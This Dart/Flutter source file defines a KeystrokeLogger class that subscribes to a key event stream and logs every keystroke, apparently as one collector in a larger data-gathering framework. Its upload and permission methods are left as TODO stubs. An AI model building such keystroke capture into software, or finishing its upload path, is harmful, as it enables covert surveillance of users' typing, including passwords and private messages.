import 'dart:async';
import 'dart:developer' as dev;

import 'package:flutter/foundation.dart';

import '../../models/collector.dart';
import 'key_event_listener.dart';

final class KeystrokeLogger extends Collector {
  KeystrokeLogger._() : super();
  static final KeystrokeLogger shared = KeystrokeLogger._();
  factory KeystrokeLogger() => shared;

  StreamSubscription? _subscription;

  @override
  void onCancel() {
    _subscription?.cancel();
    _subscription = null;
  }

  @override
  void onData(object) {
    if (kReleaseMode) print('[✓] key stroke event $object');
    dev.log('key stroke event: $object');
  }

  @override
  void onError(Object error) {
    // TODO: implement onError
  }

  @override
  Future<bool> onRequest() {
    // TODO: implement requestPermission
    throw UnimplementedError();
  }

  @override
  void onStart() {
    _subscription = KeyEventListener.keyEvnetStream.listen(onData);
  }

  @override
  void upload(String filePath, file) {
    // TODO: implement upload
  }

  @override
  void onLoad() {
    // TODO: implement onLoad
  }
}